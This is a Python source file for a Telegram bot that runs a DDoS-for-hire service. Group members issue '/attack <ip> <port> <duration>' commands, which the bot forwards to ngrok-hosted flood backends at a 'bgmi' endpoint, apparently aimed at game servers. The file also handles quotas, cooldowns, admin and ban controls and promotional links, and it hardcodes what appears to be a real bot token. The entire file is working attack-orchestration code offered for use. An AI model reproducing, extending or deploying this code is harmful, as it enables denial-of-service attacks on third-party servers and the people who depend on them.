import asyncio
import logging
import os
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Set
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, CallbackContext
import requests

# Replace with your bot's token, private channel ID, and group ID
BOT_TOKEN = "7654893614:AAFut5QKnsqzAsUsUqNZ0MWXhZ5mOn6tcu0"
CHANNEL_ID = -1002282119711  # Replace with your channel's numeric ID
GROUP_ID = -1002342721193  # Replace with your group's numeric ID

# Ngrok URLs
ngrok_urls = [
    # Add your ngrok URLs here
]

url_usage_dict: Dict[str, Optional[datetime]] = {url: None for url in ngrok_urls}
user_attack_status: Dict[int, bool] = {}  # Track if a user's attack is in progress
cooldown_dict: Dict[int, datetime] = {}
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

max_attack_duration = 300  # Maximum attack duration in seconds
cooldown_period = 300  # Cooldown period in seconds
packet_size = 1000  # Define packet size
thread = 4  # Define thread count

ADMINS: Set[int] = set()
SUPER_ADMIN_ID = 123456789  # Replace with the actual super admin user ID
BANNED_USERS: Set[int] = set()
user_extended_limits: Dict[int, int] = {}
user_attack_count: Dict[int, int] = {}
bot_start_time = datetime.now(timezone.utc)
attack_limit_per_day = 5  # Limit each user to 5 attacks per day
attack_records_file = "attack_records.txt"
banned_users_file = "banned_users.txt"

# Helper functions
def is_super_admin(user_id: int) -> bool:
    return user_id == SUPER_ADMIN_ID

def is_admin(user_id: int) -> bool:
    return user_id in ADMINS or is_super_admin(user_id)

def load_banned_users() -> Set[int]:
    if not os.path.exists(banned_users_file):
        return set()
    with open(banned_users_file, "r") as file:
        return {int(line.strip()) for line in file}

def save_banned_users():
    with open(banned_users_file, "w") as file:
        for user_id in BANNED_USERS:
            file.write(f"{user_id}\n")

def load_attack_records() -> Dict[int, int]:
    if not os.path.exists(attack_records_file):
        return {}
    with open(attack_records_file, "r") as file:
        records = {}
        for line in file:
            user_id, count = map(int, line.strip().split(":"))
            records[user_id] = count
        return records

def save_attack_records(records: Dict[int, int]):
    with open(attack_records_file, "w") as file:
        for user_id, count in records.items():
            file.write(f"{user_id}:{count}\n")

# Check if the user is a member of the channel
async def is_user_allowed(user_id: int) -> bool:
    try:
        bot = Bot(BOT_TOKEN)
        member_status = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member_status.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logging.error(f"Error checking user membership: {e}")
        return False

# Command handler for attack
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username
    full_name = update.effective_user.full_name

    logging.info(f'Received /attack command from user {user_id} in chat {chat_id}')

    # Check if the command is given in the specified group
    if chat_id != GROUP_ID:
        await context.bot.send_message(
            chat_id=user_id,
            text="I am built such that I can only process requests in the specified group.\n"
                 "2. 🎁🎀JOIN CHANNEL :- https://t.me/+DCtV_6BsRok2YmNl\n"
                 "3.🩵💗GROUP LINK :- https://t.me/MODxvipDdos\n"
                 "4. MAKE SURE TO JOIN BOT CHANNEL AND GROUP\n"
        )
        return

    # Check if the user is banned
    if user_id in BANNED_USERS:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are banned from using this bot!*", parse_mode='Markdown')
        return

    # Check if the user is a member of the channel
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ TO USE THE BOT YOU MUST BE A MEMBER OF BOTH CHANNELS*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

    if duration > max_attack_duration:
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ The maximum attack duration is {max_attack_duration} seconds.*", parse_mode='Markdown')
        return

    if target_port in blocked_ports:
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
        return

    records = load_attack_records()
    current_time = datetime.now(timezone.utc)
    user_attack_count = records.get(user_id, 0)

    if user_attack_count >= attack_limit_per_day:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have reached the maximum daily limit of attack requests. Please try again tomorrow.*\n"
                                                             "2.😀🎁 OR CONTACT THE OWNER TO RESET YOUR COUNT ⚖️", parse_mode='Markdown')
        return

    file_path = "ip_port_combinations.txt"
    if os.path.exists(file_path):
        with open(file_path, "r") as file:
            combinations = file.readlines()
            for line in combinations:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    ip, port = parts
                    if ip == target_ip and int(port) == target_port:
                        await context.bot.send_message(chat_id=chat_id, text="*❌ This IP and port combination has already been attacked today!*", parse_mode='Markdown')
                        return

    if user_id in cooldown_dict:
        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
        if time_diff < cooldown_period:
            remaining_time = cooldown_period - int(time_diff)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ You need to wait {remaining_time} seconds before launching another attack!*",
                parse_mode='Markdown'
            )
            return

    if user_id in user_attack_status and user_attack_status[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Your previous attack request is still in progress. Please wait until it completes.*", parse_mode='Markdown')
        return

    free_ngrok_url = None
    for ngrok_url in ngrok_urls:
        if url_usage_dict.get(ngrok_url) is None or (datetime.now(timezone.utc) - url_usage_dict[ngrok_url]).total_seconds() > duration:
            free_ngrok_url = ngrok_url
            break

    if not free_ngrok_url:
        await context.bot.send_message(chat_id=chat_id, text="*❌ I AM AT MY MAXIMUM LIMIT*", parse_mode='Markdown')
        return

    url_usage_dict[free_ngrok_url] = datetime.now(timezone.utc)
    user_attack_status[user_id] = True
    records[user_id] = user_attack_count + 1
    save_attack_records(records)

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Attack request accepted! You have {attack_limit_per_day - records[user_id]} attack requests remaining for today.*", parse_mode='Markdown')

    asyncio.create_task(launch_attack(update, context, free_ngrok_url, target_ip, target_port, duration, user_id, full_name, username))

# Function to launch the attack
import logging
import asyncio
import requests
from datetime import datetime, timezone

# Function to launch the attack
async def launch_attack(update, context, ngrok_url, target_ip, target_port, duration, user_id, full_name, username):
    chat_id = update.effective_chat.id
    logging.info(f"Launching attack: {ngrok_url}, {target_ip}:{target_port}, duration: {duration}, user: {user_id}")

    try:
        url = f"{ngrok_url}/bgmi?ip={target_ip}&port={target_port}&time={duration}&packet_size={packet_size}&thread={thread}"
        headers = {"ngrok-skip-browser-warning": "any_value"}
        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            logging.info(f"Attack command sent successfully: {url}")
            logging.info(f"Response: {response.json()}")

            await context.bot.send_message(
                chat_id=GROUP_ID,
                text=(
                    f"*⚔️ Attack Launched! ⚔️*\n"
                    f"*🎯 Target: {target_ip}:{target_port}*\n"
                    f"*🕒 Duration: {duration} seconds*\n"
                    f"*👤 User: {full_name} (Username: @{username}, User ID: {user_id})*\n"
                    f"*🔥 Let the battlefield ignite! 💥*"
                ),
                parse_mode='Markdown'
            )

            file_path = "ip_port_combinations.txt"
            with open(file_path, "a") as file:
                file.write(f"{target_ip}:{target_port}\n")

            await asyncio.sleep(duration)

            url_usage_dict[ngrok_url] = None
            user_attack_status[user_id] = False

            await context.bot.send_message(
                chat_id=GROUP_ID,
                text=(
                    f"*🎯 Attack Finished!*\n"
                    f"*Target:* `{target_ip}:{target_port}`\n"
                    f"*Duration:* `{duration}` seconds\n"
                    f"*👤 User: {full_name} (Username: @{username}, User ID: {user_id})*\n"
                    f"*Status:* Completed ✅"
                ),
                parse_mode='Markdown'
            )

            # Put the user on cooldown
            cooldown_dict[user_id] = datetime.now(timezone.utc)
        else:
            logging.error(f"Failed to send attack command. Status code: {response.status_code}")
            logging.error(f"Response: {response.text}")
            url_usage_dict[ngrok_url] = None
            user_attack_status[user_id] = False

    except Exception as e:
        logging.error(f"Failed to execute command with {ngrok_url}: {e}")
        url_usage_dict[ngrok_url] = None
        user_attack_status[user_id] = False
        await context.bot.send_message(
            chat_id=GROUP_ID,
            text=f"⚠️ Failed to execute attack: {e}",
            parse_mode='Markdown'
        )

# Function to reset user attack counts
async def reset_attack_counts(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only super admin and admin can use this command!*", parse_mode='Markdown')
        return

    # Clear the attack records file
    if os.path.exists(attack_records_file):
        os.remove(attack_records_file)

    await context.bot.send_message(chat_id=chat_id, text="*✅ All user attack counts have been reset.*", parse_mode='Markdown')

# Function to add an admin
async def add_admin(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_super_admin(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the super admin can use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /addadmin <user_id>*", parse_mode='Markdown')
        return

    new_admin_id = int(context.args[0])
    ADMINS.add(new_admin_id)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {new_admin_id} added as admin.*", parse_mode='Markdown')

# Function to remove an admin
async def remove_admin(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_super_admin(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the super admin can use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /removeadmin <user_id>*", parse_mode='Markdown')
        return

    admin_id = int(context.args[0])
    ADMINS.discard(admin_id)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {admin_id} removed from admin.*", parse_mode='Markdown')

# Function to ban a user
async def ban_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only super admin and admin can use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /ban <user_id>*", parse_mode='Markdown')
        return

    banned_user_id = int(context.args[0])
    BANNED_USERS.add(banned_user_id)
    save_banned_users()
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {banned_user_id} banned.*", parse_mode='Markdown')

# Function to unban a user
async def unban_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only super admin and admin can use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /unban <user_id>*", parse_mode='Markdown')
        return

    unban_user_id = int(context.args[0])
    BANNED_USERS.discard(unban_user_id)
    save_banned_users()
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {unban_user_id} unbanned.*", parse_mode='Markdown')

# Function to list ngrok URLs
async def list_ngrok(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_super_admin(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the super admin can use this command!*", parse_mode='Markdown')
        return

    ngrok_list = "\n".join(ngrok_urls)
    await context.bot.send_message(chat_id=chat_id, text=f"*Current ngrok URLs:*\n{ngrok_list}", parse_mode='Markdown')

# Function to add a ngrok URL
async def add_ngrok(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_super_admin(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the super admin can use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /addngrok <ngrok_url>*", parse_mode='Markdown')
        return

    ngrok_url = context.args[0]
    if ngrok_url in ngrok_urls:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ This ngrok URL is already in the list.*", parse_mode='Markdown')
        return

    ngrok_urls.append(ngrok_url)
    url_usage_dict[ngrok_url] = None

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ngrok URL added: {ngrok_url}*", parse_mode='Markdown')

# Function to remove a ngrok URL
async def remove_ngrok(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_super_admin(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the super admin can use this command!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /removengrok <ngrok_url>*", parse_mode='Markdown')
        return

    ngrok_url = context.args[0]
    if ngrok_url not in ngrok_urls:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ This ngrok URL is not in the list.*", parse_mode='Markdown')
        return

    ngrok_urls.remove(ngrok_url)
    del url_usage_dict[ngrok_url]

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ngrok URL removed: {ngrok_url}*", parse_mode='Markdown')

# Function to show current configuration
# Function to ban a user


# Function to show current configuration
async def show_config(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_super_admin(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the super admin can use this command!*", parse_mode='Markdown')
        return

    config_text = (
        f"*Current Configuration:*\n"
        f"📦 *Packet Size:* {packet_size}\n"
        f"🧵 *Thread:* {thread}\n"
        f"⏳ *Max Attack Duration:* {max_attack_duration} seconds\n"
        f"⏳ *Cooldown Period:* {cooldown_period} seconds\n"
        f"🔢 *Attack Limit Per Day:* {attack_limit_per_day}\n"
    )

    await context.bot.send_message(chat_id=chat_id, text=config_text, parse_mode='Markdown')

# Function to handle the start command
async def start(update: Update, context: CallbackContext):
    user = update.effective_user
    chat_id = update.effective_chat.id

    if chat_id == GROUP_ID:
        await update.message.reply_text(
            f"🎉 Welcome, {user.first_name}! You can use the /attack command to launch an attack.\n"
            "1. Each user will get 5 attack requests per day based on the response and load on the server.\n"
            "2. Be civil and respectful. Don't spam; spamming will lead to a direct ban.\n"
        )
    else:
        await update.message.reply_text("🚫 This bot can only be used in the specified group.")


# Function to show remaining time for the next reset
async def show_reset_time(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only super admin and admin can use this command!*", parse_mode='Markdown')
        return

    current_time = datetime.now(timezone.utc)
    next_reset_time = bot_start_time + timedelta(days=1)
    remaining_time = next_reset_time - current_time

    if remaining_time.total_seconds() < 0:
        next_reset_time = bot_start_time + timedelta(days=2)
        remaining_time = next_reset_time - current_time

    hours, remainder = divmod(remaining_time.total_seconds(), 3600)
    minutes, seconds = divmod(remainder, 60)
    formatted_remaining_time = f"{int(hours):02}:{int(minutes):02}:{int(seconds):02}"

    await context.bot.send_message(chat_id=chat_id, text=f"*🕒 Time remaining for next reset: {formatted_remaining_time}*", parse_mode='Markdown')

# Help command to show appropriate help section based on user role
async def help(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if is_super_admin(user_id):
        await help_super_admin(update, context)
    elif is_admin(user_id):
        await help_admin(update, context)
    else:
        await help_user(update, context)

# Help command for super admins
async def help_super_admin(update: Update, context: CallbackContext):
    help_text = (
        "Super Admin Commands:\n"
        "/start - Start the bot\n"
        "/attack <ip> <port> <duration> - Launch an attack\n"
        "/listngrok - List current ngrok URLs\n"
        "/addngrok <ngrok_url> - Add a new ngrok URL\n"
        "/removengrok <ngrok_url> - Remove an ngrok URL\n"
        "/showconfig - Show current configuration\n"
        "/updateconfig - Update configuration values\n"
        "/addadmin <user_id> - Add a new admin\n"
        "/removeadmin <user_id> - Remove an admin\n"
        "/ban <user_id> - Ban a user\n"
        "/unban <user_id> - Unban a user\n"
        "/resetcounts - Reset all user attack counts\n"
        "/resettime - Show remaining time for the next reset\n"
    )
    await update.message.reply_text(help_text)

# Help command for admins
async def help_admin(update: Update, context: CallbackContext):
    help_text = (
        "Admin Commands:\n"
        "/start - Start the bot\n"
        "/attack <ip> <port> <duration> - Launch an attack\n"
        "/ban <user_id> - Ban a user\n"
        "/unban <user_id> - Unban a user\n"
        "/resetcounts - Reset all user attack counts\n"
        "/resettime - Show remaining time for the next reset\n"
    )
    await update.message.reply_text(help_text)

# Help command for users
async def help_user(update: Update, context: CallbackContext):
    help_text = (
        "Available Commands:\n"
        "/start - Start the bot\n"
        "/attack <ip> <port> <duration> - Launch an attack\n"
        "/help - Show this help message\n"
    )
    await update.message.reply_text(help_text)
    from telegram.ext import Application, CommandHandler, ConversationHandler, MessageHandler
import telegram.ext.filters as filters

# States for conversation handler
(PACKET_SIZE, THREAD, MAX_ATTACK_DURATION, COOLDOWN_PERIOD) = range(4)

def is_super_admin(user_id: int) -> bool:
    return user_id == SUPER_ADMIN_ID

# Function to start the update configuration process
async def start_update_config(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if not is_super_admin(user_id):
        await update.message.reply_text("❌ Only the super admin can use this command!")
        return ConversationHandler.END

    await update.message.reply_text("Please provide the new packet_size:")
    return PACKET_SIZE

# Function to set packet_size
async def set_packet_size(update: Update, context: CallbackContext):
    global packet_size

    try:
        packet_size = int(update.message.text)
        await update.message.reply_text(f"✅ packet_size updated to {packet_size}. Please provide the new thread:")
        return THREAD
    except ValueError:
        await update.message.reply_text("❌ Invalid input. Please provide a valid integer for packet_size:")
        return PACKET_SIZE

# Function to set thread
async def set_thread(update: Update, context: CallbackContext):
    global thread

    try:
        thread = int(update.message.text)
        await update.message.reply_text(f"✅ thread updated to {thread}. Please provide the new max_attack_duration (seconds):")
        return MAX_ATTACK_DURATION
    except ValueError:
        await update.message.reply_text("❌ Invalid input. Please provide a valid integer for thread:")
        return THREAD

# Function to set max_attack_duration
async def set_max_attack_duration(update: Update, context: CallbackContext):
    global max_attack_duration

    try:
        max_attack_duration = int(update.message.text)
        await update.message.reply_text(f"✅ max_attack_duration updated to {max_attack_duration} seconds. Please provide the new cooldown_period (seconds):")
        return COOLDOWN_PERIOD
    except ValueError:
        await update.message.reply_text("❌ Invalid input. Please provide a valid integer for max_attack_duration:")
        return MAX_ATTACK_DURATION

# Function to set cooldown_period
async def set_cooldown_period(update: Update, context: CallbackContext):
    global cooldown_period

    try:
        cooldown_period = int(update.message.text)
        await update.message.reply_text(f"✅ cooldown_period updated to {cooldown_period} seconds. Configuration update complete.")
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("❌ Invalid input. Please provide a valid integer for cooldown_period:")
        return COOLDOWN_PERIOD

# Function to cancel the update process
async def cancel_update(update: Update, context: CallbackContext):
    await update.message.reply_text("Configuration update cancelled.")
    return ConversationHandler.END

# Main function to start the bot
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Add the configuration update handler
    updateconfig_handler = ConversationHandler(
        entry_points=[CommandHandler("updateconfig", start_update_config)],
        states={
            PACKET_SIZE: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_packet_size)],
            THREAD: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_thread)],
            MAX_ATTACK_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_max_attack_duration)],
            COOLDOWN_PERIOD: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_cooldown_period)],
        },
        fallbacks=[CommandHandler("cancel", cancel_update)]
    )

    # Add all command handlers to the application
    application.add_handler(updateconfig_handler)
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("addadmin", add_admin))
    application.add_handler(CommandHandler("removeadmin", remove_admin))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("unban", unban_user))
    application.add_handler(CommandHandler("resetcounts", reset_attack_counts))
    application.add_handler(CommandHandler("listngrok", list_ngrok))
    application.add_handler(CommandHandler("addngrok", add_ngrok))
    application.add_handler(CommandHandler("removengrok", remove_ngrok))
    application.add_handler(CommandHandler("showconfig", show_config))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("resettime", show_reset_time))

    # Load banned users at the start
    global BANNED_USERS
    BANNED_USERS = load_banned_users()

    application.run_polling()

if __name__ == "__main__":
    main()